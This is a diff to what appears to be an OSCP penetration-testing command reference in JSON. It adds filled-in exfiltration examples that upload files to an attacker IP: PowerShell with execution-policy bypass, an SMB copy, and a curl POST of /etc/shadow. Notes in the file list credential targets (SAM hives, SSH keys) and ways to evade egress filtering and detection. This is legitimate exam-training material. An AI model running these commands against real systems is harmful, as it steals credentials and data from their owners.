@@ -76,7 +76,8 @@
         "ft-file-verify-md5"
       ],
       "notes": "OSCP METHODOLOGY: Primary exfiltration method for Windows targets. Clean, fast, uses HTTPS-capable PowerShell. Ideal for proof.txt, database dumps, or any files under 100MB.\n\nMANUAL ALTERNATIVE: Could manually encode file as base64 and copy/paste, but direct upload is faster and cleaner.\n\nEXAM TIP: Start uploadserver on Kali BEFORE running this command. Files save to directory where uploadserver started - cd to organized location first. Verify upload success: ls -lh and md5sum on Kali.\n\nCOMMON TARGETS: proof.txt, local.txt, SAM/SYSTEM hives, Secretsdump.py output, screenshots, database files.\n\nVS SMB UPLOAD: PowerShell upload works over HTTP (port 80/443) which often passes egress filters better than SMB (port 445). SMB is faster for large files.\n\nTIME ESTIMATE: 2-10 seconds for typical proof files (<1MB), longer for large files (database dumps, memory dumps).",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "powershell -ep bypass -c \"Invoke-RestMethod -Uri http://10.10.14.5:80/upload -Method Post -InFile 'C:\\Users\\user\\Desktop\\proof.txt'\""
     },
     {
       "id": "ft-smb-upload",
@@ -146,7 +147,8 @@
       ],
       "next_steps": [],
       "notes": "OSCP METHODOLOGY: Fastest exfiltration method for large files (>10MB) from Windows targets. 10-100x faster than HTTP for database dumps, memory dumps, or archives. Works well on internal networks where port 445 allowed.\n\nMANUAL ALTERNATIVE: Mount as persistent drive: net use Z: \\\\<IP>\\share then copy files to Z:\\ drive.\n\nEXAM TIP: If uploading multiple files, use wildcards: copy C:\\loot\\*.* \\\\<IP>\\share\\ to transfer entire directory. For newer Windows (10+), expect to need authentication - setup SMB server with -username/-password flags.\n\nSECURITY EVASION: SMB file copies blend with normal network file sharing traffic, harder to detect than HTTP uploads.\n\nVS HTTP UPLOAD: SMB is much faster for large files but requires port 445. HTTP upload works through more restrictive firewalls (port 80/443).\n\nTIME ESTIMATE: Limited only by network speed - can transfer multi-GB files in minutes on local network.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "copy \"C:\\Users\\user\\Desktop\\data.zip\" \\\\10.10.14.5\\share\\"
     },
     {
       "id": "ft-curl-upload",
@@ -218,7 +220,8 @@
       ],
       "next_steps": [],
       "notes": "OSCP METHODOLOGY: Primary exfiltration method for Linux targets. Clean, fast, uses HTTP which typically passes egress filters. Ideal for proof.txt, /etc/shadow, database dumps, or any sensitive files.\n\nMANUAL ALTERNATIVE: Could use base64 encoding and copy/paste for small files, but direct upload is cleaner and works for binary files.\n\nALTERNATIVE UPLOAD: curl --upload-file <FILE> http://<IP>:<PORT>/ (PUT method, may not work with uploadserver)\n\nEXAM TIP: Start uploadserver on Kali BEFORE running this command. Files save to directory where uploadserver started - cd to organized location first (/root/loot/<TARGET>/). Verify upload: ls -lh and md5sum.\n\nCOMMON TARGETS: proof.txt, /etc/passwd, /etc/shadow, .ssh/id_rsa, database dumps, config files with credentials.\n\nPROGRESS INDICATION: Add -# for progress bar on large files: curl -# -X POST -F file=@largefile.zip http://...\n\nTIME ESTIMATE: 2-5 seconds for typical files (<5MB), longer for large database/memory dumps.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "curl -X POST -F file=@/etc/shadow http://10.10.14.5:80/upload"
     }
   ]
 }
